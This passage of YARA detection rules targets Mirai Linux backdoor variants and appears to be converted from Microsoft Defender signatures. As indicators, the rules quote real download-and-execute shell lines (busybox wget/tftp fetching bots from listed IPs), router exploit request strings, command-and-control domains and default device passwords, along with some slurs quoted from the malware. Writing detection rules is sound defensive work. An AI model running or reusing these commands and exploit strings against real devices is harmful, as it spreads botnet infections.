        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Finding and killing processes holding port %d" ascii //weight: 1
        $x_1_2 = "[dbg / killer]" ascii //weight: 1
        $x_1_3 = "Re-scanning all processes" ascii //weight: 1
        $x_1_4 = {5b 6b 69 6c 6c 65 72 20 2f 20 [0-16] 5d 20 4b 69 6c 6c 65 64 3a 20 25 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CF_2147766625_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CF!MTB"
        threat_id = "2147766625"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GET /bot.sh" ascii //weight: 1
        $x_1_2 = "adminXXXX1234" ascii //weight: 1
        $x_2_3 = "/bin/busybox tftp -r bot.%s -l .b -g %d.%d.%d.%d; /bin/busybox chmod 777 .b; ./.b scan.tftp.%s" ascii //weight: 2
        $x_2_4 = "/bin/busybox wget http://%d.%d.%d.%d/bot.%s -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.%s; >.b" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CE_2147766630_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CE!MTB"
        threat_id = "2147766630"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 25 32 30 68 74 74 70 3a 2f 2f [0-16] 2f [0-8] 2e 73 68 25 32 30 2d 4f 25 32 30 2d 25 33 45 25 32 30 2f 74 6d 70 2f [0-8] 3b 73 68 25 32 30 2f 74 6d 70 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "POST /command.php HTTP/1.1" ascii //weight: 1
        $x_1_3 = "POST /tmBlock.cgi HTTP/1.1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_C_2147766841_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.C!MTB"
        threat_id = "2147766841"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killer_kill_by_port" ascii //weight: 1
        $x_1_2 = "attack_get_opt_ip" ascii //weight: 1
        $x_1_3 = "attack_udp_dns" ascii //weight: 1
        $x_1_4 = "anti_gdb_entry" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AH_2147767142_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AH!MTB"
        threat_id = "2147767142"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_stomptcp" ascii //weight: 1
        $x_1_2 = "scanner_kill" ascii //weight: 1
        $x_1_3 = "attack_hthrax" ascii //weight: 1
        $x_1_4 = "attack_plaintcp" ascii //weight: 1
        $x_1_5 = "chmod +x %s; ./%s %s.update" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AJ_2147767616_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AJ!MTB"
        threat_id = "2147767616"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cd /tmp/||cd /usr/sbin||cd /var/tmp;" ascii //weight: 1
        $x_1_2 = {77 67 65 74 20 90 01 04 3a 2f 2f 65 76 30 6c 76 65 2e 63 66 2f 61 72 6d 20 7c 7c 20 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74 70 20 2d 67 20 65 76 30 6c 76 65 2e 63 66 20 2d 72 20 61 72 6d}  //weight: 1, accuracy: High
        $x_1_3 = "/bin/busybox chmod 777 arm;./arm self.download || rm arm -rf" ascii //weight: 1
        $x_1_4 = "chmod +x mpsl ; ./mpsl self.download" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AM_2147770142_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AM!MTB"
        threat_id = "2147770142"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "airdropmalware" ascii //weight: 1
        $x_1_2 = "Tsunami" ascii //weight: 1
        $x_2_3 = "Botnet Made By greek.Helios, and Thar3seller" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AN_2147770322_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AN!MTB"
        threat_id = "2147770322"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 20 2d 67 20 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 20 2d 6c 20 2f 74 6d 70 2f 63 30 6d 33 20 2d 72}  //weight: 1, accuracy: Low
        $x_2_2 = "/bin/busybox chmod 777 * /tmp/c0m3; /tmp/c0m3 huawei.exploit" ascii //weight: 2
        $x_2_3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 2
        $x_1_4 = "cnc.popsocketslive.com" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AO_2147770323_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AO!MTB"
        threat_id = "2147770323"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "purenetworks.com/HNAP1/`cd /tmp && rm -rf" ascii //weight: 1
        $x_2_2 = "cnc.notabotnet.tk/notabotnet/notabotnet" ascii //weight: 2
        $x_2_3 = {63 64 20 2f 76 61 72 3b 20 72 6d 20 2d 72 66 20 6e 69 67 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 48 69 6c 69 78 2e 73 68 20 2d 4f 20 68 78 3b 20 63 68 6d 6f 64 20 37 37 37 20 68 78 3b 20 2e 2f 68 78}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AS_2147771926_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AS!MTB"
        threat_id = "2147771926"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xmasattack" ascii //weight: 1
        $x_1_2 = "icmpattack" ascii //weight: 1
        $x_1_3 = "gameattack" ascii //weight: 1
        $x_1_4 = "udpvseattack" ascii //weight: 1
        $x_1_5 = "tcpattack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AZ_2147776665_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AZ!MTB"
        threat_id = "2147776665"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bot %s successfully deployed via echo ---> [%s:%d %s:%s" ascii //weight: 1
        $x_1_2 = "bin/busybox chmod 777 %s; ./%s telnet.%s.wget" ascii //weight: 1
        $x_1_3 = "/bin/busybox chmod 777 %s; ./%s telnet.%s.tftp" ascii //weight: 1
        $x_1_4 = "/bin/busybox echo -en '%s' %s %s && /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_B_2147781025_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.B!MTB"
        threat_id = "2147781025"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "airdropmalware" ascii //weight: 1
        $x_1_2 = "Tsunami" ascii //weight: 1
        $x_1_3 = "KILLATTK" ascii //weight: 1
        $x_1_4 = "your_verry_fucking_gay" ascii //weight: 1
        $x_1_5 = "wget+http%3A%2F%2F179.43.149.189%2Fbins%2Flinksys.cloudbot%3B+chmod+777+linksys.cloudbot%3B+.%2Flinksys.cloudbot+linksys.cloudbot%60" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BB_2147783870_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BB!MTB"
        threat_id = "2147783870"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "This Device Has Been Infected by Samael Botnet Made By ur0a :)" ascii //weight: 1
        $x_1_2 = "infected.log" ascii //weight: 1
        $x_1_3 = "Samael-DDoS-Attack" ascii //weight: 1
        $x_1_4 = "B0TK1LL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_2147784140_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.jj!MTB"
        threat_id = "2147784140"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "jj: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {44 89 c9 66 0f b6 47 09 c1 e9 10 41 8d 0c 08 66 c1 c8 08 0f b7 c0 01 c1 89 d0 81 e2 ff ff 00 00 c1 e8 10 01 d0 41 0f b7 d1 01 d0 41 0f b7 d2 01 d0 8d 04 01 89 c2 c1 ea 10}  //weight: 1, accuracy: High
        $x_1_2 = {48 89 c1 40 0f b6 c6 89 c2 c1 e2 08 09 d0 48 98 48 89 c2 48 c1 e2 10 48 09 c2 48 89 d7 48 c1 e7 20 48 09 d7}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_2147784140_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.jj!MTB"
        threat_id = "2147784140"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "jj: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {73 68 65 6c 6c 3a 63 64 20 2f 64 61 74 61 2f 6c 6f 63 61 6c 2f 74 6d 70 3b 20 63 75 72 6c [0-4] 3a 2f 2f 31 30 34 2e 31 36 38 2e 32 34 38 2e 32 32 2f 63 2e 73 68 20 3e 20 63 2e 73 68 3b 20 77 67 65 74 [0-4] 3a 2f 2f 31 30 34 2e 31 36 38 2e 32 34 38 2e 32 32 2f 77 2e 73 68}  //weight: 3, accuracy: Low
        $x_3_2 = "tcp_ip=-h+%60cd%20%2Ftmp%3B%20rm%20-rf%20Trinity.mpsl%3B%20wget%20http%3A%2F%2F185.244.25.138%2FTrinity.mpsl%3B%20chmod%20777%20Trinity.mpsl%3B%20.%2FTrinity.mpsl%20linksys" ascii //weight: 3
        $x_2_3 = {73 68 65 6c 6c 5f 65 78 65 63 26 76 61 72 73 5b 31 5d 5b 5d 3d 20 27 77 67 65 74 [0-4] 3a 2f 2f 31 38 35 2e 32 34 34 2e 32 35 2e 31 33 38 2f 54 72 69 6e 69 74 79 2e 78 38 36 20 2d 4f 20 2f 74 6d 70 2f 2e 6c 6f 6c 69 3b 20 63 68 6d 6f 64 20 37 37 37 20 2f 74 6d 70 2f 2e 6c 6f 6c 69}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_JK_2147784846_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JK!MTB"
        threat_id = "2147784846"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 43 0c 8d 4c 18 1c 0f b7 51 10 01 c2 8b 41 08 89 53 0c 8b 51 0c 89 43 04 89 53 08}  //weight: 1, accuracy: High
        $x_1_2 = {57 56 53 8b 5c 24 10 8b 43 0c 3b 43 10 7c ?? be dc 00 00 00 8b 13 bf 00 08 00 00 8d 4b 1c 89 f0 e8 fb 03 00 00 83 f8 00 89 c7 7f ?? 7d ?? 83 f8 fe 74 ?? e8 b8 01 00 00 f7 df 89 38}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JK_2147784846_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JK!MTB"
        threat_id = "2147784846"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "var/cowffxxna" ascii //weight: 1
        $x_1_2 = "/var/downloader" ascii //weight: 1
        $x_1_3 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii //weight: 1
        $x_1_4 = "/var/Sofia" ascii //weight: 1
        $x_1_5 = "9xsspnvgc8aj5pi7m28p" ascii //weight: 1
        $x_1_6 = "Moobot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Mirai_B_2147789137_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.B!xp"
        threat_id = "2147789137"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UDPRAW" ascii //weight: 1
        $x_1_2 = "Nemesis infection success" ascii //weight: 1
        $x_1_3 = "KILLBOT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_C_2147789138_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.C!xp"
        threat_id = "2147789138"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KILLBOT" ascii //weight: 1
        $x_1_2 = "miori remastered infection successful" ascii //weight: 1
        $x_1_3 = "209.141.61.135" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_D_2147789139_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.D!xp"
        threat_id = "2147789139"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "4r3s b0tn3t" ascii //weight: 1
        $x_1_2 = "iptables -A INPUT -p tcp --destination-port 5555 -j DROP" ascii //weight: 1
        $x_1_3 = "sh lol.sh" ascii //weight: 1
        $x_1_4 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 90 02 15 2f 62 69 6e 64 2f 61 2e 73 68 20 2d 4f 20 2d 20 3e 20 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_E_2147789140_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.E!xp"
        threat_id = "2147789140"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii //weight: 2
        $x_1_2 = "BANKTY DDOS FOR 91" ascii //weight: 1
        $x_1_3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/" ascii //weight: 1
        $x_1_4 = "suckmadick" ascii //weight: 1
        $x_1_5 = "considertogoofflinetyvm" ascii //weight: 1
        $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_F_2147789274_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.F!xp"
        threat_id = "2147789274"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "purenetworks.com/HNAP1/" ascii //weight: 1
        $x_1_2 = {2f 74 6d 70 [0-17] 68 75 61 77 65 69 2e 65 78 70 6c 6f 69 74}  //weight: 1, accuracy: Low
        $x_1_3 = "/nig realtek.exploit" ascii //weight: 1
        $x_1_4 = "/bin/busybox chmod 777 * /tmp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_F_2147789274_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.F!xp"
        threat_id = "2147789274"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "initiating lockdown" ascii //weight: 1
        $x_1_2 = "wordtheminer" ascii //weight: 1
        $x_1_3 = ".updater" ascii //weight: 1
        $x_2_4 = "SO190Ij1X" ascii //weight: 2
        $x_1_5 = {06 30 d2 e7 22 30 23 e2 06 30 c2 e7 01 20 82 e2 02 00 57 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
        $x_1_6 = "wolfexecbin" ascii //weight: 1
        $x_1_7 = ".hbot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_G_2147793506_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.G!xp"
        threat_id = "2147793506"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {61 64 62 20 2d 73 20 73 68 65 6c 6c 20 63 64 20 2f 64 61 74 61 2f 6c 6f 63 61 6c 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-8] 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 [0-8] 2e 73 68 3b 20 73 68 20 [0-8] 2e 73 68 3b 20 72 6d 20 [0-8] 2e 73 68}  //weight: 3, accuracy: Low
        $x_1_2 = "/admin/testaction.cgi?=type=ntp&server=cd /tmp; rm -rf" ascii //weight: 1
        $x_3_3 = {74 61 72 67 65 74 5f 61 64 64 72 3d 3b 63 64 25 32 46 76 61 72 25 32 46 63 6f 6e 66 69 67 2b 77 67 65 74 2b 2d 4f 2b 2d 2b 68 74 74 70 25 33 41 25 32 46 25 32 46 [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 25 32 46 [0-5] 2e 73 68}  //weight: 3, accuracy: Low
        $x_1_4 = "/linuxki443/experimental/vis/ki443vis.php?type=ki443trace&pid=1;#{cd /tmp;wget " ascii //weight: 1
        $x_1_5 = {6a 61 76 61 2e 6c 61 6e 67 2e 52 75 6e 74 69 6d 65 27 29 2e 67 65 74 4d 65 74 68 6f 64 73 28 29 5b 36 5d 2e 69 6e 76 6f 6b 65 28 6e 75 6c 6c 29 2e 65 78 65 63 28 27 63 64 20 2f 74 6d 70 3b 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 66 65 74 63 68 2e 73 68 3b 63 68 6d 6f 64 20 37 37 37 20 66 65 74 63 68 2e 73 68 3b 73 68 20 66 65 74 63 68 2e 73 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_I_2147793754_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.I!xp"
        threat_id = "2147793754"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bots1.firewalla1337.cc" ascii //weight: 1
        $x_3_2 = "/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii //weight: 3
        $x_1_3 = "scan1.firewalla1337.cc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_I_2147793754_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.I!xp"
        threat_id = "2147793754"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "f324asc.sinistermc.xyz" ascii //weight: 1
        $x_1_2 = "838ybj8mnfi" ascii //weight: 1
        $x_1_3 = "NiGGeR69xd " ascii //weight: 1
        $x_1_4 = "hacktheworld1337" ascii //weight: 1
        $x_1_5 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgvf324asd.sinistermc.xyz" ascii //weight: 1
        $x_1_6 = "start-shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_J_2147793893_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.J!xp"
        threat_id = "2147793893"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "miraiMIRAI" ascii //weight: 1
        $x_1_2 = "stdflood" ascii //weight: 1
        $x_1_3 = "C0NN3CT3D" ascii //weight: 1
        $x_1_4 = "VSzNC0CJti3ouku" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_J_2147793893_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.J!xp"
        threat_id = "2147793893"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox TSUNAMI" ascii //weight: 1
        $x_1_2 = "cd /; wget http://209.141.45.139/sora.sh;" ascii //weight: 1
        $x_3_3 = "\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_K_2147794268_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.K!xp"
        threat_id = "2147794268"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {74 63 70 66 72 61 67 20 73 74 61 72 74 65 64 00 74 63 70 61 6c 6c 20 73 74 61 72 74 65 64 00 00 2f 00 00 00 32 30 39 2e 31 34 31 2e 34 32 2e 31 34 39 00}  //weight: 1, accuracy: High
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_R_2147796512_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.R!xp"
        threat_id = "2147796512"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox wget -g 146.196.67.61 -l /tmp/monke -r /u" ascii //weight: 1
        $x_1_2 = "/tmp/monke selfrep.router" ascii //weight: 1
        $x_1_3 = "x8E/x9F/xD9/x81/x83/x99" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_L_2147797644_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.L!xp"
        threat_id = "2147797644"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox ASUNA" ascii //weight: 1
        $x_1_2 = "hacktheworld1337" ascii //weight: 1
        $x_1_3 = "t0talc0ntr0l4" ascii //weight: 1
        $x_1_4 = "vstarcam2015" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_O_2147805199_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.O!xp"
        threat_id = "2147805199"
        type = "Backdoor"
